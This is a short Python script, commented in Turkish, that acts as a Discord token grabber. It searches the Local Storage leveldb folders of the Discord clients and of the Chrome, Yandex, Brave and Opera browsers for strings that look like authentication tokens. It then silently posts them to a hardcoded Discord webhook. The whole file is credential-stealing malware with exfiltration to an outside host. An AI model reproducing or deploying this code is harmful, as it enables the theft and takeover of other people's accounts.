import os
import re
import requests

# discord webhook bilgileri
webhook_url = "https://discordapp.com/api/webhooks/1518883589842931883/Mhg0BBmPFYnQfl2ROPDEvfHbzvZbAPDeKPi8ISGtMnFh3cxhthP2eX9U5g3LODYbH8l-"
avatar_url = "WEBHOOK_AVATAR_URL"
webhook_nickname = "WEBHOOK_NICKNAME"

def get_tokens():
    tokens = []
    user_home = os.expanduser("~")
    
    # java kodundaki klasör yollarının python karşılıkları
    paths = [
        os.path.join(user_home, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Local", "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(user_home, "AppData", "Roaming", "Opera Software", "Opera Stable", "User Data", "Default", "Local Storage", "leveldb")
    ]
    
    for path in paths:
        if not os.path.exists(path):
            continue
            
        for file_name in os.listdir(path):
            file_path = os.path.join(path, file_name)
            if not os.path.isfile(file_path):
                continue
                
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        # java kodundaki "oken" arama ve tırnak arası string ayıklama mantığı
                        # regex ile "oken" kelimesinden sonra gelen tırnak içindeki değerleri yakalar
                        matches = re.findall(r'oken.+"([^"]+)"', line)
                        for token in matches:
                            # java kodundaki nokta kontrolü (.split("\\.").length >= 2)
                            if len(token.split(".")) >= 2:
                                if token not in tokens:
                                    tokens.append(token)
            except Exception:
                pass
                
    return tokens

def main():
    tokens = get_tokens()
    if not tokens:
        return

    # mesaj içeriğini hazırlama
    content = ""
    for token in tokens:
        content += f":small_orange_diamond: [TOKEN] {token}\n"
        
    # discord webhook payload yapısı
    payload = {
        "content": content,
        "username": webhook_nickname,
        "avatar_url": avatar_url
    }
    
    try:
        requests.post(webhook_url, json=payload)
    except Exception:
        pass

if __name__ == "__main__":
    main()
